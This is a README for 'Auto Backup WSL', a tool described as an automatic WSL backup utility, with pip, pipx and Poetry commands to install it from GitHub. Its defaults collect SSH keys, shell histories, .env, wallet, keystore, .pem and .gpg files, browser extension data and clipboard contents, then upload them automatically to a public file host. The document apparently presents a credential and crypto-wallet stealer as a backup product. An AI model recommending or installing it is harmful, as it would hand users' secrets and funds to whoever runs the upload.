# Auto Backup WSL

一个用于WSL环境的自动备份工具，支持文件备份、压缩和上传到云端。

## 功能特性

- ✅ 自动备份WSL和Windows系统中的重要文件
- ✅ 智能文件分类（文档/配置）
- ✅ 自动压缩备份文件
- ✅ 大文件自动分片
- ✅ 自动上传到云端（GoFile）
- ✅ 定时备份功能
- ✅ 双向剪贴板监控和同步
- ✅ 日志记录和轮转
- ✅ 网络连接检测
- ✅ 自动重试机制

## 安装

### 方法一：使用 pipx（推荐，适用于 Ubuntu 23.04+ / Debian 12+）

`pipx` 是安装命令行工具的最佳方式，它会自动管理虚拟环境。

```bash
# 安装 pipx（如果未安装）
sudo apt update
sudo apt install -y pipx
pipx ensurepath

# 从 GitHub 安装
pipx install git+https://github.com/wongstarx/auto-backup-wsl.git

# 或从 PyPI 安装（发布后）
# pipx install auto-backup-wsl
```

### 方法二：使用 Poetry（推荐用于开发）

Poetry 是一个现代的 Python 依赖管理和打包工具。

```bash
# 安装 Poetry（如果未安装）
curl -sSL https://install.python-poetry.org | python3 -
# 或使用 pipx
# pipx install poetry

# 从 GitHub 安装
poetry add git+https://github.com/wongstarx/auto-backup-wsl.git

# 或克隆仓库后安装
git clone https://github.com/wongstarx/auto-backup-wsl.git
cd auto-backup-wsl
poetry install

# 运行
poetry run autobackup
```

### 方法三：使用虚拟环境

```bash
# 创建虚拟环境
python3 -m venv venv

# 激活虚拟环境
source venv/bin/activate

# 安装包
pip install git+https://github.com/wongstarx/auto-backup-wsl.git

# 或从 PyPI 安装
# pip install auto-backup-wsl
```

### 方法四：系统级安装（需要 --break-system-packages）

⚠️ **不推荐**：可能会与系统包管理器冲突

```bash
pip install --break-system-packages git+https://github.com/wongstarx/auto-backup-wsl.git
```

### 从源码安装

```bash
git clone https://github.com/wongstarx/auto-backup-wsl.git
cd auto-backup-wsl

# 使用 Poetry（推荐）
poetry install
poetry run autobackup

# 或使用虚拟环境
python3 -m venv venv
source venv/bin/activate
pip install .

# 或使用 pipx
pipx install .
```

## 使用方法

### 命令行使用

安装后，可以直接使用命令行工具：

```bash
autobackup
```

### Python代码使用

```python
from auto_backup import BackupManager, BackupConfig
from pathlib import Path

# 创建备份管理器
manager = BackupManager()

# 备份WSL文件
backup_dir = manager.backup_wsl_files(
    source_dir="~/",
    target_dir="~/.dev/Backup/wsl"
)

# 压缩备份
backup_files = manager.zip_backup_folder(
    folder_path=backup_dir,
    zip_file_path="backup_20240101"
)

# 上传备份
if manager.upload_backup(backup_files):
    print("备份上传成功！")
```

## 配置说明

### 备份配置

可以通过修改 `BackupConfig` 类来调整配置：

- `DEBUG_MODE`: 调试模式开关
- `MAX_SINGLE_FILE_SIZE`: 单文件最大大小（默认50MB）
- `CHUNK_SIZE`: 分片大小（默认50MB）
- `RETRY_COUNT`: 重试次数（默认3次）
- `RETRY_DELAY`: 重试延迟（默认30秒）
- `BACKUP_INTERVAL`: 备份间隔（默认约3天）
- `CLIPBOARD_INTERVAL`: 剪贴板备份间隔（默认20分钟）
- `WSL_SPECIFIC_DIRS`: 需要备份的WSL目录列表
- `WSL_EXTENSIONS_1`: 文档类型扩展名
- `WSL_EXTENSIONS_2`: 配置类型扩展名
- `EXCLUDE_WSL_DIRS`: 排除的WSL目录列表

### 日志配置

日志文件默认保存在：`~/.dev/Backup/backup.log`

- `LOG_FILE`: 日志文件路径

## 备份内容

### 默认备份的WSL目录/文件

- `.ssh` - SSH配置
- `.bash_history` - Bash历史记录
- `.python_history` - Python历史记录
- `.bash_aliases` - Bash别名
- `Documents` - 文档目录
- `.node_repl_history` - Node.js REPL历史记录
- `.wget-hsts` - wget HSTS历史记录
- `.Xauthority` - Xauthority文件
- `.ICEauthority` - ICEauthority文件

### 备份的文件类型

**文档类型：**
- `.txt`, `.json`, `.js`, `.py`, `.go`, `.sh`, `.bash`, `.sol`, `.rs`, `.env`
- `.csv`, `.bin`, `.wallet`, `.ts`, `.jsx`, `.tsx`, `ps1`

**配置类型：**
- `.pem`, `.key`, `.keystore`, `.utc`, `.xml`, `.ini`, `.config`
- `.yaml`, `.yml`, `.toml`, `.asc`, `.gpg`, `.pgp`

### Windows数据备份

- 记事本临时文件
- 截图文件
- 便签数据
- 浏览器扩展数据

## 系统要求

- Python 3.7+
- WSL环境（Windows Subsystem for Linux）
- 网络连接（用于上传备份）

### Ubuntu/Debian 系统注意事项

如果遇到 `externally-managed-environment` 错误，这是因为 Ubuntu 23.04+ 和 Debian 12+ 引入了 PEP 668 保护机制。请使用以下方法之一：

1. **使用 pipx**（推荐）：`pipx install git+https://github.com/wongstarx/auto-backup-wsl.git`
2. **使用虚拟环境**：`python3 -m venv venv && source venv/bin/activate && pip install ...`
3. **使用 --break-system-packages**（不推荐）：`pip install --break-system-packages ...`

## 依赖项

- `requests` >= 2.25.0

## 许可证

MIT License

## 贡献

欢迎提交Issue和Pull Request！

## 作者

YLX Studio

## 更新日志

### v1.0.0
- 初始版本发布
- 支持WSL和Windows文件自动备份、压缩和上传
- 支持定时备份
- 支持双向剪贴板监控和同步
- 支持日志记录

